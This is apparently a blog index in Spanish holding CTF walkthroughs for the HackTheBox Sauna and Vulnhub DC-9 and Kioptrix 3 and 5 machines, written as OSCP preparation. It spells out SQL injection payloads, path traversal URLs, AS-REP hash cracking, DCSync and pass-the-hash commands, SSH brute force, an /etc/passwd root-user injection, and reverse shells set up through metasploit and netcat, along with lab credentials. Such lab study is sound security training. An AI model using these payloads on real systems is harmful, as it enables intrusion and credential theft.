[{"categories":["HacktheBox"],"content":"Sauna ","date":"2023-11-08","objectID":"/antu97-6.github.io/AnTu97-6x/sauna/:0:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/sauna/"},{"categories":["HacktheBox"],"content":"Escaneo y Enumeración Una vez conectado con la VPN y encendido la maquina en hackthebox inicio la fase de escaneo y enumeración lanzando la herramienta nmap realizando un escaneo de puertos para obtener servicios y versiones de los puertos abiertos. Iniciamos la maquina lanzando un escaneo de puertos con nmap. nmap -T4 -p- -A 10.10.10.175 Output: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 13:43 EST Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.13% done Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.62% done; ETC: 13:53 (0:10:07 remaining) Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.25% done; ETC: 13:52 (0:08:41 remaining) Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.61% done; ETC: 13:51 (0:08:04 remaining) Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 75.00% done; ETC: 13:45 (0:00:13 remaining) Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.96% done; ETC: 13:46 (0:00:00 remaining) Nmap scan report for 10.10.10.175 Host is up (0.040s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-06 01:45:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49668/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-11-06T01:46:05 |_ start_date: N/A |_clock-skew: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 40.04 ms 10.10.14.1 2 40.24 ms 10.10.10.175 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.70 seconds Observando el resultado, veo que se trata de un controlador de dominio y que el dominio es EGOTISTICAL-BANK.LOCAL y lo primero que se me ocurre es como obtener usuarios validos del controlador del dominio. Primero lanzo la herramienta rpcclient para ver si puedo obtener usuarios pero no tengo éxito ya que no esta habilitado la null sesion (acceso sin credenciales). r","date":"2023-11-08","objectID":"/antu97-6.github.io/AnTu97-6x/sauna/:1:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/sauna/"},{"categories":["HacktheBox"],"content":"Explotación Lanzo de nuevo la herramienta kerbrute con la nueva lista ./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local users.txt Y obtenemos un hash Hash: $krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:d4b3b166aac99836201bbe442d83f8cd$484c733a9d5ce4f6f20f4b522a7b721609c0dacefb845b4f7c1e49a8d1b1886611fba87622cef20aff5ba5447b10f3da794c393744cd2678e94e9ba2ba92a0d29e202ec1d864885b9a9f6a5df463b11587dbc48f3bc0424f710d43ac0d8555b38379f35c1b94a4892669fde4d69cf2bf001f9b792e2180c6f1ea53a28f8900a93e5111c161948f91a64be36c5c8c854d8d90203ce6aab155bde6d3908e8a5c3143fe98830852f808ff8badd93090a4b29421c27a5aba7f98d66ffaa31a292b7b04415d2e0a93b1fba14a5a5f7f614bf0677e9b53c8f7673becdd9873390fc64f8231c99c14846280f5858e81eb472cbaa30156a5ddf7f4a8a641758ccb19775e9f6c8156ceda4f1485078e48b4b7fc6a44cd0ca8aa80 Lo crackeamos con john echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9954ba527554fb3bede345eec9cdb16$96156f42762421bd97ebf37e092cfffebf37bde8f60743e36f9d7f78c1f0b18f7150361cda4e8f48cbc6b73800a480bb728497ef44355869649c910ba1fe98a5212f7a160a011316a703857fc2cd0d0ce24b527a97fc75f3205931a7caf7c01f329c76313cbf696df729fa52acadf61e9275a10d2fe9bf89bb2c0ae8ea6cfa419ae71cfbdcf554cb1685597c3e764861459a0dfa6b92bb2f5432cefb7ed57cfcc423176b9e2b454675711837b4ca1d17ef0188b4befa8f52d873ccd3e87b337b390fe1eae5a1654b14c596fb5ae16c2c160d48b57e247a765f616cd6cb6a8b7bf02a92100070367128f0a7267397874ed038fbeb13631f3ab51edead31e36609' \u003e hash.txt crackeamos john -w=/usr/share/wordlists/rockyou.txt hash.txt inicio sesión sesión con evil-winrm ya que el puerto 5985 esta abierto evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175 ","date":"2023-11-08","objectID":"/antu97-6.github.io/AnTu97-6x/sauna/:2:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/sauna/"},{"categories":["HacktheBox"],"content":"Escalada de Privilegios Una vez en el sistema le paso winpeas en busca de poder escalar privilegios y encuentro la siguiente contraseña en texto plano. Si probamos a iniciar sesion con el usurio svc_loanmanager no vamos a tener exito si realizamos el siguiente comando veremos los usuarios del sistema net user Nos fijamos que se escribe svc_loanmgr iniciamos sesión con el nuevo usuario con winrm evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175 Tras una enumeración veo que tengo los mismos permisos que con el usuario fsmith. Por lo que pruebo a usar BloodHound Transfiero SharpHound.ps1 a la maquina con: #En kali locate SharpHound.ps1 cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 . #en la terminal de winrm upload SharpHound.ps1 #Importamos . .\\SharpHound.ps1 # y ejecutamos Invoke-BloodHound -CollectionMethod All #Transferimos el zip a nuestra maquina download 20231106220357_BloodHound.zip Iniciamos Bloodhound sudo bloodhound Buscamos los nombres de los usuarios a los que tenemos acceso y los marcamos como owned después vemos que podemos realizar un ataque Dcsync haciendo clic en el apartado de analisis la opcion Find Shortest Paths to domain Admins Hacemos clic en donde pone DCSync, seleccionamos help y nos indica como efectuar el ataque Con secretsdump obtenemos los hashes para hacer un Passthehash /opt/impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175 Nos conectamos con winrm evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175 y obtenemos una powershell como administrador. ","date":"2023-11-08","objectID":"/antu97-6.github.io/AnTu97-6x/sauna/:3:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/sauna/"},{"categories":["Vulnhub"],"content":"DC-9 Pagina de la maquina: https://www.vulnhub.com/entry/dc-9,412/ Enlace de descarga: https://download.vulnhub.com/dc/DC-9.zip Dc-9 es una de las maquinas de vulnhub que contiene el listado de Tjnull, el cual es un listado creado para prepararse el examen del OSCP, esta maquina es la primera de la lista con un nivel similar a las maquinas del curso que el OSCP ofrece. ","date":"2023-09-23","objectID":"/antu97-6.github.io/AnTu97-6x/dc-9/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/dc-9/"},{"categories":["Vulnhub"],"content":"Escaneo de la Red El primer paso es encontrar la ip de nuestro objetivo, para ello utilizamos Arp-Scan, esta herramienta permite escanear una red LAN y descubrir dispositivos conectados en ella. sudo arp-scan -interface eth1 -l Hemos descubierto que la ip de nuestro objetivo es la 192.168.34.5. Una vez obtenida la ip pasamos a un escaneo de puertos y servicios con nmap. sudo nmap -sV 192.168.34.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:06 CEST Nmap scan report for example.com (192.168.34.5) Host is up (0.00052s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds Vemos que el puerto 80 esta abierto y corre un Apache con versión 2.4.38. También vemos que el puerto ssh esta filtrado pero poco se puede hacer con la información que tenemos hasta ahora por lo que pasamos a ver la web en el puerto 80. ","date":"2023-09-23","objectID":"/antu97-6.github.io/AnTu97-6x/dc-9/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/dc-9/"},{"categories":["Vulnhub"],"content":"Enumeración Navegando por la web veo que hay un campo ‘search’ que realiza una búsqueda de los usuarios de la compañia. Lo primero que se me ocurre es probar si es vulnerable a sqli por lo que introduzco la siguiente consulta: Mary ' or 1=1-- - Y veo que es vulnerable a sqli por lo que paso a obtener información de la base de datos. Primero obtengo el numero de columnas añadiendo el valor null por cada columna hasta que obtenga respuesta con la siguiente consulta: Mary' union select null,null,null,null,null,null-- - Después paso a listar las bases de datos que hay, con la siguiente consulta: Mary' union select null,schema_name,null,null,null,null from information_schema.schemata-- - Vemos que existen las bases de datos Staff y users. El siguiente paso que realizo es listar las tablas que contiene la base de datos users Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='users'-- - Y veo que existe la tabla UserDetails, después paso a listar las columnas de esta tabla. Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='UserDetails'-- - Obtengo las columnas id, firstname, lastname, username, password, y reg_date, por lo que solo queda listar el contenido de las columnas. con la siguiente consulta indico que se muestre los valores de las columnas username y password indicando la tabla que pertenece a la base de datos users. Mary' union select null,CONCAT(username, \":\" ,password),null,null,null,null from users.UserDetails-- - marym:3kfs86sfd julied:468sfdfsd2 fredf:4sfd87sfd1 barneyr:RocksOff tomc:TC\u0026TheBoyz jerrym:B8m#48sd wilmaf:Pebbles bettyr:BamBam01 chandlerb:UrAG0D! joeyt:Passw0rd rachelg:yN72#dsd rossg:ILoveRachel monicag:3248dsds7s phoebeb:smellycats scoots:YR3BVxxxw87 janitor:Ilovepeepee janitor2:Hawaii-Five-0 Guardo las credenciales en un fichero llamado creds. Obtenemos un listado de usuarios y contraseñas pero no son validas en el login de la web por lo que pasamos a enumerar la base de datos Staff de la misma forma que hemos hecho con users. Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='Staff'-- - Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='Users'-- - Mary' union select null,CONCAT(username,':',password),null,null,null,null from Users-- - Obtenemos usuario admin y un hash md5. Con el hash paso a crackearlo en una web online https://crackstation.net/ admin:856f5de590ef37314e7c3bdf6f8a66dc Y obtengo la contraseña: transorbital1 ","date":"2023-09-23","objectID":"/antu97-6.github.io/AnTu97-6x/dc-9/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/dc-9/"},{"categories":["Vulnhub"],"content":"Explotación Inicio sesion Tras iniciar sesión observamos un apartado en la parte inferior de la pagina que dice File does not exist, parece que intenta cargar un archivo pero no existe, esto me hace pensar que puede que este buscando un archivo en alguna ruta del sistema por lo que pruebo lo siguiente. http://192.168.34.5/manage.php?file=../../../../../../../etc/passwd Tenemos exito, en el escaneo con nmap descubrimos que el puerto ssh estaba filtrado y lo que me viene a la cabeza es la tecnica de Port Knocking por lo que voy a ver los archivos de configuración de Knock http://192.168.34.5/manage.php?file=../../../../../../../etc/knockd.conf Obtenemos la secuencia para introducir con knock knock -v 192.168.34.5 7469 8475 9842 hitting tcp 192.168.34.5:7469 hitting tcp 192.168.34.5:8475 hitting tcp 192.168.34.5:9842 Compruebo que el puerto se haya abierto nmap -sV 192.168.34.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:20 CEST Nmap scan report for example.com (192.168.34.5) Host is up (0.00012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80/tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds con los usuarios obtenidos anteriormente realizo un ataque de fuerza bruta con hydra creo fichero con usuarios cat creds | cut -d ':' -f1 \u003e users.txt Creo fichero passwords cat creds | cut -d ':' -f2 \u003e passwords.txt hydra -L users.txt -P passwords.txt 192.168.34.5 ssh Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-23 13:27:05 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task [DATA] attacking ssh://192.168.34.5:22/ [22][ssh] host: 192.168.34.5 login: chandlerb password: UrAG0D! [22][ssh] host: 192.168.34.5 login: joeyt password: Passw0rd [22][ssh] host: 192.168.34.5 login: janitor password: Ilovepeepee [STATUS] 287.00 tries/min, 287 tries in 00:01h, 4 to do in 00:01h, 14 active 1 of 1 target successfully completed, 3 valid passwords found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-23 13:28:08 chandlerb:UrAG0D joeyt:Passw0rd janitor:Ilovepeepee Inicio sesión como janitor ssh janitor@192.168.34.5 Enumerando encontramos el siguiente directorio Dentro encontramos el fichero passwords-found-on-post-it-notes.txt con las siguientes passwords BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts realizo un nuevo ataque de fuerza bruta con las passwords obtenidas hydra -L users.txt -P newpasswords 192.168.34.5 ssh Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 20:34:37 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task [DATA] attacking ssh://192.168.34.5:22/ [22][ssh] host: 192.168.34.5 login: fredf password: B4-Tru3-001 [22][ssh] host: 192.168.34.5 login: joeyt password: Passw0","date":"2023-09-23","objectID":"/antu97-6.github.io/AnTu97-6x/dc-9/:3:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/dc-9/"},{"categories":["Vulnhub"],"content":"Escalada de Privilegios Inicio de sesión como fredf ssh fredf@192.168.34.5 Ejecutamos sudo -l y vemos que tenemos permisos para ejecutar el siguiente script lo ejecuto para ver como funciona Parece que se le introducen dos ficheros el primero que lee y el segundo al que es añadido el contenido del primero por lo que para escalar privilegios voy a crear un usuario y lo voy a añadir al archivo passwd Creación del hash del usuario (Password 123) openssl passwd -1 $1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1 Creamos un fichero con lo siguiente (user.txt) user:$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1:0:0:user:/root:/bin/bash Ejecutamos script sudo /opt/devstuff/dist/test/test user.txt /etc/passwd cambiamos al nuevo usuario como root fredf@dc-9:~$ su user Password: root@dc-9:/home/fredf# whoami root Y eso es todo Happy Hacking! ","date":"2023-09-23","objectID":"/antu97-6.github.io/AnTu97-6x/dc-9/:4:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/dc-9/"},{"categories":["Vulnhub"],"content":"Kioptrix level 5 ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Configuración Para que la maquina asigne una ip hay que eliminar el adaptador de red y volver a añadirlo. ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Resolución ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Escaneo y nalisis de Vulnerabilidades Comienzo haciendo un escaneo de la red local con arp-scan para descubrir la ip de la maquina objetivo. arp-scan -I eth0 --localnet -I -\u003e indicamos la interfaz de red --localnet -\u003e indicamos que genere direcciones desde la configuración de la interfaz. Obtengo que la ip de mi objetivo es la 192.168.66.163, por lo que paso a realizar un escaneo de puertos con nmap. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.163 -oN Target Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:46 EDT Initiating ARP Ping Scan at 15:46 Scanning 192.168.66.163 [1 port] Completed ARP Ping Scan at 15:46, 0.06s elapsed (1 total hosts) Initiating SYN Stealth Scan at 15:46 Scanning 192.168.66.163 [65535 ports] Discovered open port 80/tcp on 192.168.66.163 Discovered open port 8080/tcp on 192.168.66.163 Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 9.90% done; ETC: 15:48 (0:01:31 remaining) Completed SYN Stealth Scan at 15:47, 53.95s elapsed (65535 total ports) Nmap scan report for 192.168.66.163 Host is up, received arp-response (0.00015s latency). Scanned at 2023-08-31 15:46:49 EDT for 54s Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 8080/tcp open http-proxy syn-ack ttl 64 MAC Address: 00:0C:29:5B:14:9E (VMware) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 54.25 seconds Raw packets sent: 131110 (5.769MB) | Rcvd: 50 (2.410KB) Observo que los puertos 80 y 8080 están abiertos, y paso a realizar un segundo escaneo mas especifico para obtener la versión de los servicios que corren. ──(root㉿kali)-[/home/kali/vulnhub/OSCP/kioptrix_level_5] └─# nmap -p80,8080 -sCV 192.168.66.163 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:49 EDT Nmap scan report for 192.168.66.163 Host is up (0.00040s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8) 8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8) |_http-title: 403 Forbidden MAC Address: 00:0C:29:5B:14:9E (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds Tras revisar los resultados me fije en que la versión de mod_ssl/2.2.21 es vulnerable pero el exploit para esta vulnerabilidad no contiene una versión valida para FreeBSD apache 2.2.21 por lo que no funciono. Después pase a revisar la web con el puerto 80. Y al abrir el código fuente de la pagina descubrí una dirección url. Al abrirla descubrí lo siguiente: ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Explotación Buscando lo que es phpchart supe que se trata de una librería de php para mostrar datos de texto de forma grafica. Después busque si existe alguna vulnerabilidad para esta versión y di con la siguiente pagina. Exploiting pChart 2.1.3 (Directory traversal \u0026 XSS) Leyendo veo que es vulnerable a directory traversal por lo que introduzco la siguiente dirección y obtengo el fichero /etc/passwd http://192.168.66.163/pChart2.1.3/examples/index.php?Action=View\u0026Script=/../../../../etc/passwd Leyendo un poco mas la web descubro que los sistemas operativos FreeBSD tienen el archivo de configuración de Apache en la siguiente ruta por lo que paso a leerla. /usr/local/etc/apache22/httpd.conf Observando el resultado y tras intentar un log poison sin éxito veo que el fichero de configuración muestra un User-Agent permitido (Mozilla/4.0 Mozilla4 browser) y un virtualHost en el puerto 8080 A través de una extensión del navegador cambio el user agent https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/ Con el user agent cambiado realizo la búsqueda de la web con el puerto 8080 y veo lo siguiente. hago clic en phptax y aparece la siguiente pagina. Buscando un exploit para phptax encuentro los siguientes he decidido usar metasploit por lo que ejecutando la siguiente serie de comandos obtengo una shell. #iniciamos metasploit msfconsole -q #buscamos el exploit search phptax #selecionamos el exploit use 0 #configuramos options set RHOSTS 192.168.66.163 set RPORT 8080 show advanced set UserAgent Mozilla/4.0 Mozilla4_browser set payload payload/cmd/unix/reverse set LHOST 192.168.66.152 set LPORT 4444 run ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Escalada de privilegios Obtenemos una shell y enumeramos. whoami www id uid=80(www) gid=80(www) groups=80(www) uname -a FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan 3 07:46:30 UTC 2012 root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC amd64 Tras enumerar un poquito el siguiente paso que realice fue buscar si existe algún exploit para la versión de FreeBSD de la maquina. Existe un exploit para escalar privilegios por lo que me lo descargo en mi maquina para después transferirlo a la maquina objetivo con netcat. searchsploit -m freebsd/local/26368.c Exploit: FreeBSD 9.0 \u003c 9.1 - 'mmap/ptrace' Local Privilege Escalation URL: https://www.exploit-db.com/exploits/26368 Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c Codes: CVE-2013-2171, OSVDB-94414 Verified: True File Type: C source, ASCII text Copied to: /home/kali/vulnhub/OSCP/kioptrix_level_5/26368.c Me pongo a la escucha en mi kali y me conecto desde la maquina objetivo para realizar la transferencia en el directorio /tmp. #Kali nc -lvp 4444 \u003c 26368.c listening on [any] 4444 ... #kioptrix nc -nv 192.168.66.152 4444 \u003e 26368.c Connection to 192.168.66.152 4444 port [tcp/*] succeeded! una vez transferido compilo el exploit y ejecuto obteniendo una shell como root gcc 26368.c -o exploit ./exploit whoami root id uid=0(root) gid=0(wheel) egid=80(www) groups=80(www) cat congrats.txt If you are reading this, it means you got root (or cheated). ","date":"2023-09-02","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/:2:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Kioptrix Level 3 ","date":"2023-08-25","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Resolución de la Maquina ","date":"2023-08-25","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Escaneo y Análisis de Vulnerabilidades Empezamos con un escaneo a nuestra red local con el comando arp para obtener la ip de nuestra maquina objetivo. arp-scan -I eth0 --localnet Una vez obtenida la ip procedemos a realizar un escaneo con nmap. nmap -sCV 192.168.66.161 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-25 13:37 EDT Nmap scan report for kioptrix3.com (192.168.66.161) Host is up (0.0099s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) | ssh-hostkey: | 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA) |_ 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch |_http-title: Ligoat Security - Got Goat? Security ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds Tras realizar el escaneo con nmap vemos que tiene el puerto 80 abierto con un servicio http por lo que vamos a ver que contiene utilizando nuestro buscador en este caso Firefox y vemos la siguiente web. En la descripcion de la maquina nos dice que añadamos el dominio kioptrix3.com a nuestro fichero /etc/hosts para poder ver bien la web por lo que lo abrimos y añadimos lo siguiente: 192.168.66.161 kioptrix3.com ","date":"2023-08-25","objectID":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/:1:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/antu97-6.github.io/AnTu97-6x/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Explotación Tras husmear por la pagina vemos que la web esta hecha con LotusCMS Por lo que pasamos a buscar en Google si existe algún exploit para este CMS y encontramos el siguiente: https://github.com/Hood3dRob1n/LotusCMS-Exploit lo clonamos a nuestra maquina y ejecutamos ./lotusRCE.sh kioptrix3.com / #Introducimos nuestra ip 192.168.66.152 #El puerto 4444 #En otra terminal iniciamos netcat nc -nlvp 4444 #selecionamos la opcion 1 1 #obtenemos una shell nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.66.152] from (UNKNOWN) [192.168.66.161] 38651 whoami www-data Realizamos un tratamiento de la tty para trabajar mas cómodos y poder hacer Ctrl+C script /dev/null -c bash stty raw –echo; fg reset xterm export SHELL=bash export TERM=xterm stty rows \u003cnum\u003e columns \u003ccols\u003e Tras enumerar un rato encontramos el archivo gconfig.php en /home/www/kioptrix3.com/gallery el cual contiene unas credenciales a la base de datos. Nos logeamos en mysql: mysql -uroot -pfuckeyou Y obtenemos las credenciales del usuario admin pero tras realizar unos intentos no nos sirve para cambiar de usuario. Pasamos a logearnos en phpmyadmin con las credenciales obtenidas anteriormente. y localizamos los hashes de los usuarios de la maquina he utilizado una web online para crackear estos hashes obteniendo la contraseña en texto claro https://crackstation.net/ Dreg loneferret dreg:Mast3r 